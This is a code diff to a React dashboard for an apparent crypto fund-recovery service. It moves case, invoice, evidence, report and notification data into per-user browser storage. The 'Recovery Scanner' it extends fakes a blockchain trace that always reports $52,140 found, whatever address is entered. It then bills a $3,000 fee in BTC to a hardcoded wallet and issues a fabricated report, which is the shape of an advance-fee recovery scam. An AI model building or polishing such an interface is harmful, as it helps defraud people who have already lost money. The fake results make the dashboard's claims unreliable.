@@ -3,12 +3,14 @@ import type { Page } from '../App'
 import type { AuthUser } from '../lib/auth'
 import { LOGO_URL } from '../lib/branding'
 import { addReceipt } from '../lib/receipts'
+import { loadList, saveList } from '../lib/storage'
 import {
-  Search, Upload, MessageSquare, FileText, Clock,
+  Search, Upload, FileText, Clock,
   ArrowLeft, AlertTriangle, Check, ChevronRight,
   Lock, Plus, Download, Loader, Bell, Receipt, Copy,
   FolderOpen, User, FileUp, Bitcoin, LogOut, Wallet
 } from 'lucide-react'
+import type { LucideIcon } from 'lucide-react'
 
 const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
 const BTC_PRICE = 66240
@@ -28,31 +30,64 @@ interface Case {
   wallet: string
 }
 
-const MESSAGES = [
-  { from: 'Investigator', time: '2h ago', text: 'We located 0.84 BTC ($52,140) linked to your case. The funds are traceable. Complete the recovery service fee to proceed with the release process.' },
-  { from: 'You', time: '1d ago', text: 'Any update on the exchange identification? Our attorney needs the entity name for the subpoena.' },
-  { from: 'Investigator', time: '1d ago', text: 'We have identified two exchanges that received funds. One is a US-registered entity. Report update coming within 24 hours.' },
-]
+interface EvidenceItem {
+  id: string
+  name: string
+  size: string
+  type: string
+  date: string
+  status: 'Verified' | 'Under review'
+  dataUrl?: string
+}
 
-const EVIDENCE = [
-  { name: 'Police_Report_Hack.pdf', size: '1.2 MB', type: 'PDF', date: 'Jul 28, 2026', status: 'Verified' },
-  { name: 'Exchange_Statement_Jul.pdf', size: '840 KB', type: 'PDF', date: 'Jul 28, 2026', status: 'Verified' },
-  { name: 'Wallet_Tx_Screenshot.png', size: '2.1 MB', type: 'PNG', date: 'Jul 29, 2026', status: 'Under review' },
-]
+interface Invoice {
+  id: string
+  caseId: string
+  amount: string
+  currency: string
+  status: 'Paid' | 'Pending'
+  date: string
+  method: string
+  tx: string
+}
 
-const INVOICES = [
-  { id: 'INV-2026-0104', client: 'Jane D.', amount: '$3,000.00', currency: 'USD', status: 'Paid', date: 'Aug 1, 2026', method: 'BTC', tx: 'bc1qs9qkg8crclk...' },
-  { id: 'INV-2026-0103', client: 'Jane D.', amount: '$3,000.00', currency: 'USD', status: 'Paid', date: 'Jul 12, 2026', method: 'BTC', tx: 'bc1qs9qkg8crclk...' },
-  { id: 'INV-2026-0102', client: 'Jane D.', amount: '$3,000.00', currency: 'USD', status: 'Pending', date: 'Jul 28, 2026', method: 'BTC', tx: '—' },
-]
+interface ReportItem {
+  id: string
+  name: string
+  date: string
+  pages: number | null
+  format: string
+}
 
-const NOTIFICATIONS = [
-  { icon: Bitcoin, text: 'Funds located on your case CS-2026-0891 — 0.84 BTC traced', time: '2h ago', unread: true },
-  { icon: Receipt, text: 'Invoice INV-2026-0104 marked as paid', time: '1d ago', unread: true },
-  { icon: MessageSquare, text: 'New message from your investigator', time: '1d ago', unread: true },
-  { icon: FolderOpen, text: 'Evidence verified: Police_Report_Hack.pdf', time: '2d ago', unread: false },
-  { icon: FileText, text: 'Final case report ready for CS-2026-0620', time: '3d ago', unread: false },
-]
+interface NotificationItem {
+  id: string
+  icon: 'bitcoin' | 'receipt' | 'filetext' | 'folderopen'
+  text: string
+  time: string
+  unread: boolean
+}
+
+const NOTIF_ICONS: Record<NotificationItem['icon'], LucideIcon> = {
+  bitcoin: Bitcoin,
+  receipt: Receipt,
+  filetext: FileText,
+  folderopen: FolderOpen,
+}
+
+function useStore<T>(kind: string, userId: string | undefined) {
+  const [items, setItems] = useState<T[]>(() => loadList<T>(kind, userId ?? 'guest'))
+  useEffect(() => {
+    setItems(loadList<T>(kind, userId ?? 'guest'))
+  }, [kind, userId])
+  const set = (next: T[] | ((prev: T[]) => T[])) => {
+    setItems(prev => {
+      const value = typeof next === 'function' ? (next as (p: T[]) => T[])(prev) : next
+      saveList<T>(kind, userId ?? 'guest', value)
+      return value
+    })
+  }
+  return [items, set] as const
+}
 
 interface Props {
   onBack: () => void
@@ -63,19 +98,29 @@ interface Props {
 }
 
 export default function Dashboard({ onBack, navigate, initialAddress, user, onSignOut }: Props) {
-  const [tab, setTab] = useState<'cases' | 'submit' | 'scan' | 'messages' | 'evidence' | 'invoices' | 'reports' | 'notifications'>('cases')
+  const [tab, setTab] = useState<'cases' | 'submit' | 'scan' | 'evidence' | 'invoices' | 'reports' | 'notifications'>('cases')
   const [scanAddr, setScanAddr] = useState('')
   const [phase, setPhase] = useState<'idle' | 'scanning' | 'payment' | 'received' | 'processing' | 'done'>('idle')
   const [scanProgress, setScanProgress] = useState(0)
   const [secondsLeft, setSecondsLeft] = useState(360)
-  const [message, setMessage] = useState('')
   const [submitDone, setSubmitDone] = useState(false)
   const [copied, setCopied] = useState(false)
   const [receiptName, setReceiptName] = useState('')
   const [receiptDataUrl, setReceiptDataUrl] = useState('')
-  const [cases, setCases] = useState<Case[]>([])
+  const [evidenceError, setEvidenceError] = useState('')
   const [form, setForm] = useState({ name: '', email: '', incident: '', wallets: '', amount: '', chain: 'Bitcoin', date: '' })
   const initialRan = useRef(false)
+
+  const uid = user?.id ?? 'guest'
+  const [cases, setCases] = useStore<Case>('cases', uid)
+  const [evidence, setEvidence] = useStore<EvidenceItem>('evidence', uid)
+  const [invoices, setInvoices] = useStore<Invoice>('invoices', uid)
+  const [reports, setReports] = useStore<ReportItem>('reports', uid)
+  const [notifications, setNotifications] = useStore<NotificationItem>('notifications', uid)
+
+  const totalPaid = invoices.filter(i => i.status === 'Paid').reduce((s, i) => s + (parseFloat(i.amount.replace(/[^0-9.]/g, '')) || 0), 0)
+  const outstanding = invoices.filter(i => i.status === 'Pending').reduce((s, i) => s + (parseFloat(i.amount.replace(/[^0-9.]/g, '')) || 0), 0)
+  const nextInvoice = invoices.find(i => i.status === 'Pending')
 
   const scanInterval = useRef<ReturnType<typeof setInterval> | null>(null)
   const flowTimer = useRef<ReturnType<typeof setTimeout> | null>(null)
@@ -125,19 +170,38 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
       if (remaining <= 0) {
         clearScanTimers()
         const isEth = target.startsWith('0x')
+        const caseId = isEth ? 'CS-2026-0E92' : 'CS-2026-0891'
+        const created = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
         setCases(prev => [{
-          id: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
+          id: caseId,
           title: isEth ? 'Ethereum Recovery Scan' : 'Bitcoin Recovery Scan',
           status: 'Funds Located',
           chain: isEth ? 'ETH' : 'BTC',
           amount: '$52,140',
           progress: 100,
-          created: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+          created,
           feeRequired: '$3,000',
           feePaid: false,
           eta: 'Awaiting fee',
           wallet: target,
         }, ...prev.filter(c => c.wallet !== target)])
+        setInvoices(prev => [{
+          id: `INV-${new Date().getFullYear()}-${Date.now().toString(36).toUpperCase()}`,
+          caseId,
+          amount: '$3,000.00',
+          currency: 'USD',
+          status: 'Pending',
+          date: created,
+          method: 'BTC',
+          tx: '—',
+        }, ...prev])
+        setNotifications(prev => [{
+          id: `ntf-${Date.now()}`,
+          icon: 'bitcoin',
+          text: `Funds located on your case ${caseId} — 0.84 BTC traced`,
+          time: 'Just now',
+          unread: true,
+        }, ...prev])
         setPhase('payment')
       }
     }, 1000)
@@ -147,20 +211,45 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
     if (!receiptName || !receiptDataUrl) return
     clearScanTimers()
     const isEth = scanAddr.startsWith('0x')
+    const caseId = isEth ? 'CS-2026-0E92' : 'CS-2026-0891'
     addReceipt({
-      caseId: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
+      caseId,
       clientName: user?.name ?? 'Client',
       email: user?.email ?? '',
       fileName: receiptName,
       size: 'Receipt',
       dataUrl: receiptDataUrl,
     })
+    const payInvId = invoices.find(inv => inv.caseId === caseId)?.id ?? `INV-${Date.now().toString(36).toUpperCase()}`
+    setInvoices(prev => prev.map(inv => inv.caseId === caseId ? { ...inv, status: 'Paid', tx: 'bc1qs9qkg8crclk...' } : inv))
     setCases(prev => prev.map(c => ({ ...c, feePaid: true })))
+    setNotifications(prev => [{
+      id: `ntf-${Date.now()}`,
+      icon: 'receipt',
+      text: `Invoice ${payInvId} marked as paid`,
+      time: 'Just now',
+      unread: true,
+    }, ...prev])
     setPhase('received')
     flowTimer.current = setTimeout(() => {
       setPhase('processing')
       flowTimer.current = setTimeout(() => {
         setPhase('done')
+        const reportDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
+        setReports(prev => [{
+          id: `rep-${Date.now()}`,
+          name: `Fund Recovery Report — ${caseId}`,
+          date: reportDate,
+          pages: 24,
+          format: 'PDF',
+        }, ...prev])
+        setNotifications(prev => [{
+          id: `ntf-${Date.now() + 1}`,
+          icon: 'filetext',
+          text: `Final case report ready for ${caseId}`,
+          time: 'Just now',
+          unread: true,
+        }, ...prev])
       }, 4000)
     }, 4000)
   }
@@ -173,6 +262,44 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
       setReceiptDataUrl(String(reader.result))
     }
     reader.readAsDataURL(file)
+  }
+
+  const onEvidenceFile = (file?: File | null) => {
+    if (!file) return
+    const sizeKB = file.size / 1024
+    const sizeStr = sizeKB >= 1024 ? `${(sizeKB / 1024).toFixed(1)} MB` : `${Math.round(sizeKB)} KB`
+    const type = (file.name.split('.').pop() || 'FILE').toUpperCase()
+    const isSmall = file.size <= 3 * 1024 * 1024
+    if (isSmall) {
+      setEvidenceError('')
+    } else {
+      setEvidenceError('File stored as metadata only — uploads stay in your browser in this demo. Files under 3 MB can be previewed.')
+    }
+    const addItem = (dataUrl?: string) => {
+      setEvidence(prev => [{
+        id: `ev-${Date.now()}`,
+        name: file.name,
+        size: sizeStr,
+        type,
+        date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+        status: 'Under review',
+        dataUrl,
+      }, ...prev])
+      setNotifications(prev => [{
+        id: `ntf-${Date.now()}`,
+        icon: 'folderopen',
+        text: `Evidence received: ${file.name} — under review`,
+        time: 'Just now',
+        unread: true,
+      }, ...prev])
+    }
+    if (isSmall) {
+      const reader = new FileReader()
+      reader.onload = () => addItem(String(reader.result))
+      reader.readAsDataURL(file)
+    } else {
+      addItem(undefined)
+    }
   }
 
   const resetScanner = () => {
@@ -189,7 +316,6 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
     { id: 'cases', label: 'My Cases', icon: FileText },
     { id: 'submit', label: 'Submit Case', icon: Plus },
     { id: 'scan', label: 'Recovery Scanner', icon: Search },
-    { id: 'messages', label: 'Messages', icon: MessageSquare },
     { id: 'evidence', label: 'Evidence', icon: FolderOpen },
     { id: 'invoices', label: 'Invoices & Payments', icon: Receipt },
     { id: 'reports', label: 'Reports', icon: Download },
@@ -634,73 +760,67 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
               </div>
             )}
 
-            {/* Messages */}
-            {tab === 'messages' && (
-              <div className="bg-white border border-[#e2e6ed] rounded-xl flex flex-col" style={{ height: 520 }}>
-                <div className="px-5 py-4 border-b border-[#e2e6ed]">
-                  <p className="font-medium">Case CS-2026-0891 — Investigator Chat</p>
-                  <p className="text-xs text-[#00875a] flex items-center gap-1 mt-0.5"><span className="w-1.5 h-1.5 rounded-full bg-[#00875a] inline-block" /> Investigator online</p>
-                </div>
-                <div className="flex-1 overflow-y-auto p-5 space-y-4">
-                  {MESSAGES.map((m, i) => (
-                    <div key={i} className={`flex ${m.from === 'You' ? 'justify-end' : 'justify-start'}`}>
-                      <div className={`max-w-sm rounded-2xl px-4 py-3 text-sm ${m.from === 'You' ? 'bg-[#0057ff] text-white' : 'bg-[#f1f3f7] text-[#0f1117]'}`}>
-                        <p className={`font-mono text-[10px] mb-1 ${m.from === 'You' ? 'text-blue-200' : 'text-[#6b7280]'}`}>{m.from} · {m.time}</p>
-                        {m.text}
-                      </div>
-                    </div>
-                  ))}
-                </div>
-                <div className="border-t border-[#e2e6ed] p-4 flex gap-3">
-                  <input value={message} onChange={e => setMessage(e.target.value)}
-                    className="flex-1 border border-[#e2e6ed] rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#0057ff]"
-                    placeholder="Message your investigator..." />
-                  <button onClick={() => setMessage('')} className="bg-[#0057ff] text-white px-4 py-2.5 rounded-xl text-sm font-medium hover:bg-[#0042cc] transition-colors">Send</button>
-                </div>
-              </div>
-            )}
-
             {/* Evidence */}
             {tab === 'evidence' && (
               <div className="space-y-4">
                 <div className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                   <div className="flex items-center justify-between mb-4">
                     <h2 className="font-semibold">Submitted Evidence</h2>
-                    <button className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium">
+                    <label className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium cursor-pointer">
                       <FileUp size={13} /> Upload Document
-                    </button>
+                      <input type="file" accept="image/*,application/pdf" className="hidden" onChange={e => onEvidenceFile(e.target.files?.[0])} />
+                    </label>
                   </div>
-                  {EVIDENCE.map((e, i) => (
-                    <div key={i} className="flex items-center justify-between py-3.5 border-b border-[#e2e6ed] last:border-0">
-                      <div className="flex items-center gap-3">
+                  {evidence.length === 0 ? (
+                    <div className="py-12 text-center">
+                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
+                        <FolderOpen size={20} className="text-[#6b7280]" />
+                      </div>
+                      <p className="font-medium text-sm mb-1">No evidence uploaded yet</p>
+                      <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Police reports, exchange records and screenshots you upload will appear here.</p>
+                    </div>
+                  ) : evidence.map(e => (
+                    <div key={e.id} className="flex items-center justify-between gap-3 py-3.5 border-b border-[#e2e6ed] last:border-0">
+                      <div className="flex items-center gap-3 min-w-0">
                         <div className="w-9 h-9 bg-[#e8f0ff] rounded-lg flex items-center justify-center flex-shrink-0">
                           <FileText size={15} className="text-[#0057ff]" />
                         </div>
-                        <div>
-                          <p className="text-sm font-medium">{e.name}</p>
+                        <div className="min-w-0">
+                          <p className="text-sm font-medium truncate">{e.name}</p>
                           <p className="font-mono text-xs text-[#6b7280]">{e.size} · {e.type} · {e.date}</p>
                         </div>
                       </div>
-                      <div className="flex items-center gap-3">
+                      <div className="flex items-center gap-3 flex-shrink-0">
                         <span className={`font-mono text-[10px] px-2 py-0.5 rounded-full ${
                           e.status === 'Verified' ? 'bg-[#e3f5ee] text-[#00875a]' : 'bg-[#fef3c7] text-[#b45309]'
                         }`}>{e.status}</span>
-                        <button className="text-[#6b7280] hover:text-[#0057ff] transition-colors"><Download size={14} /></button>
+                        {e.dataUrl ? (
+                          <a href={e.dataUrl} download={e.name} title="Download" className="text-[#6b7280] hover:text-[#0057ff] transition-colors"><Download size={14} /></a>
+                        ) : (
+                          <span title="Stored locally — metadata only"><Lock size={14} className="text-[#c8cfd9]" /></span>
+                        )}
                       </div>
                     </div>
                   ))}
+                  <p className="mt-4 text-xs text-[#6b7280] flex items-center gap-1.5"><Lock size={11} /> Demo mode: files are stored only in your browser (localStorage) — nothing is sent to a server.</p>
                 </div>
+                {evidenceError && (
+                  <div className="bg-[#fef3c7] rounded-xl p-4 flex gap-3">
+                    <AlertTriangle size={16} className="text-[#b45309] flex-shrink-0 mt-0.5" />
+                    <p className="text-sm text-[#b45309]">{evidenceError}</p>
+                  </div>
+                )}
               </div>
             )}
 
             {/* Invoices */}
             {tab === 'invoices' && (
               <div className="space-y-4">
-                <div className="grid grid-cols-3 gap-4">
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                   {[
-                    { label: 'Total Paid', value: '$6,000' },
-                    { label: 'Outstanding', value: '$3,000' },
-                    { label: 'Next Payment', value: 'INV-2026-0102' },
+                    { label: 'Total Paid', value: `$${totalPaid.toLocaleString(undefined, { minimumFractionDigits: 2 })}` },
+                    { label: 'Outstanding', value: `$${outstanding.toLocaleString(undefined, { minimumFractionDigits: 2 })}` },
+                    { label: 'Next Payment', value: nextInvoice ? nextInvoice.id : '—' },
                   ].map(s => (
                     <div key={s.label} className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                       <p className="text-xs text-[#6b7280] mb-1">{s.label}</p>
@@ -722,7 +842,19 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                         </tr>
                       </thead>
                       <tbody>
-                        {INVOICES.map(p => (
+                        {invoices.length === 0 ? (
+                          <tr>
+                            <td colSpan={8}>
+                              <div className="py-12 text-center">
+                                <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
+                                  <Receipt size={20} className="text-[#6b7280]" />
+                                </div>
+                                <p className="font-medium text-sm mb-1">No invoices yet</p>
+                                <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Invoices appear when a recovery scan locates funds and a service fee is billed.</p>
+                              </div>
+                            </td>
+                          </tr>
+                        ) : invoices.map(p => (
                           <tr key={p.id} className="border-b border-[#e2e6ed] last:border-0 hover:bg-[#f8f9fb] transition-colors">
                             <td className="px-5 py-3.5 font-mono text-xs text-[#0057ff]">{p.id}</td>
                             <td className="px-5 py-3.5 font-mono text-sm font-medium">{p.amount}</td>
@@ -752,23 +884,26 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
               <div className="space-y-4">
                 <div className="bg-white border border-[#e2e6ed] rounded-xl p-5">
                   <h2 className="font-semibold mb-4">Investigation Reports</h2>
-                  {[{
-                    name: 'Fund Recovery Report — CS-2026-0891', date: 'Aug 3, 2026', pages: 24, format: 'PDF' },
-                    { name: 'Blockchain Trace Analysis — CS-2026-0891', date: 'Aug 1, 2026', pages: 11, format: 'PDF' },
-                    { name: 'Transaction Data Export — CS-2026-0744', date: 'Jul 30, 2026', pages: null, format: 'CSV' },
-                    { name: 'Final Case Report — CS-2026-0620', date: 'Jul 14, 2026', pages: 38, format: 'PDF' },
-                  ].map((r, i) => (
-                    <div key={i} className="flex items-center justify-between py-3.5 border-b border-[#e2e6ed] last:border-0">
-                      <div className="flex items-center gap-3">
+                  {reports.length === 0 ? (
+                    <div className="py-12 text-center">
+                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
+                        <Download size={20} className="text-[#6b7280]" />
+                      </div>
+                      <p className="font-medium text-sm mb-1">No reports yet</p>
+                      <p className="text-sm text-[#6b7280] max-w-sm mx-auto">Investigation reports become available after a recovery is completed.</p>
+                    </div>
+                  ) : reports.map(r => (
+                    <div key={r.id} className="flex items-center justify-between py-3.5 border-b border-[#e2e6ed] last:border-0">
+                      <div className="flex items-center gap-3 min-w-0">
                         <div className="w-9 h-9 bg-[#e8f0ff] rounded-lg flex items-center justify-center flex-shrink-0">
                           <FileText size={15} className="text-[#0057ff]" />
                         </div>
-                        <div>
-                          <p className="text-sm font-medium">{r.name}</p>
+                        <div className="min-w-0">
+                          <p className="text-sm font-medium truncate">{r.name}</p>
                           <p className="font-mono text-xs text-[#6b7280]">{r.date} · {r.format}{r.pages ? ` · ${r.pages} pages` : ''}</p>
                         </div>
                       </div>
-                      <button className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium">
+                      <button className="flex items-center gap-1.5 text-xs text-[#0057ff] hover:underline font-medium flex-shrink-0">
                         <Download size={13} /> Download
                       </button>
                     </div>
@@ -782,21 +917,33 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
               <div className="bg-white border border-[#e2e6ed] rounded-xl">
                 <div className="px-5 py-4 border-b border-[#e2e6ed] flex items-center justify-between">
                   <p className="font-medium">Notifications</p>
-                  <button className="text-xs text-[#0057ff] hover:underline">Mark all read</button>
+                  <button onClick={() => setNotifications(prev => prev.map(n => ({ ...n, unread: false })))}
+                    className="text-xs text-[#0057ff] hover:underline">Mark all read</button>
                 </div>
                 <div className="divide-y divide-[#e2e6ed]">
-                  {NOTIFICATIONS.map((n, i) => (
-                    <div key={i} className="flex items-center gap-4 px-5 py-4 hover:bg-[#f8f9fb] transition-colors">
-                      <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${n.unread ? 'bg-[#f7931a]/10 text-[#f7931a]' : 'bg-[#f1f3f7] text-[#6b7280]'}`}>
-                        <n.icon size={14} />
+                  {notifications.length === 0 ? (
+                    <div className="py-12 text-center">
+                      <div className="w-12 h-12 rounded-full bg-[#f1f3f7] flex items-center justify-center mx-auto mb-3">
+                        <Bell size={20} className="text-[#6b7280]" />
                       </div>
-                      <div className="flex-1">
-                        <p className="text-sm font-medium">{n.text}</p>
-                        <p className="font-mono text-xs text-[#6b7280]">{n.time}</p>
-                      </div>
-                      {n.unread && <span className="w-2 h-2 rounded-full bg-[#f7931a]" />}
+                      <p className="font-medium text-sm mb-1">No notifications yet</p>
+                      <p className="text-sm text-[#6b7280]">Case updates and payment alerts will show up here.</p>
                     </div>
-                  ))}
+                  ) : notifications.map(n => {
+                    const Icon = NOTIF_ICONS[n.icon]
+                    return (
+                      <div key={n.id} className="flex items-center gap-4 px-5 py-4 hover:bg-[#f8f9fb] transition-colors">
+                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${n.unread ? 'bg-[#f7931a]/10 text-[#f7931a]' : 'bg-[#f1f3f7] text-[#6b7280]'}`}>
+                          <Icon size={14} />
+                        </div>
+                        <div className="flex-1">
+                          <p className="text-sm font-medium">{n.text}</p>
+                          <p className="font-mono text-xs text-[#6b7280]">{n.time}</p>
+                        </div>
+                        {n.unread && <span className="w-2 h-2 rounded-full bg-[#f7931a]" />}
+                      </div>
+                    )
+                  })}
                 </div>
               </div>
             )}
